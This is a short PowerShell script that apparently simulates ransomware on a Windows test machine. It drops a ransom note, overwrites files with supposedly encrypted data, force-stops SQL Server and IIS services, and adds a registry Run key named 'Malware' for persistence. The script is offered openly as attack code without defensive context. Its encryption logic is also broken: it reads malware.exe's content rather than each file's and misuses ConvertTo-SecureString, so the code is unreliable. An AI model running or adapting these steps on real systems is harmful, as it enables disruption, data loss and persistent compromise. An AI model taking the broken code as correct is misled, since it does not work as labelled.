$noteContent = @"
Your files have been encrypted.
To decrypt your files, please contact:
[email address]
"@
$noteContent | Set-Content -Path "C:\Users\vagrant\Desktop"
Write-Host "Ransom note created on the desktop."

$targetFiles = Get-ChildItem -Path "C:\Malicious\malware.exe" -File -Recurse
foreach ($file in $targetFiles) {
    $fileContent = Get-Content -Path "C:\Malicious\malware.exe"
    $encryptedContent = $fileContent | ConvertTo-SecureString
    $encryptedContent | Set-Content -Path $file.FullName
}
Write-Host "Files encrypted successfully."

Stop-Service -Name "SQLServer" -Force
Stop-Service -Name "IISAdmin" -Force
Write-Host "Services stopped successfully."

$registryKeyPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$executablePath = "C:\Malicious\malware.exe"
New-ItemProperty -Path $registryKeyPath -Name "Malware" -Value $executablePath -PropertyType String -Force
Write-Host "Registry modified successfully."


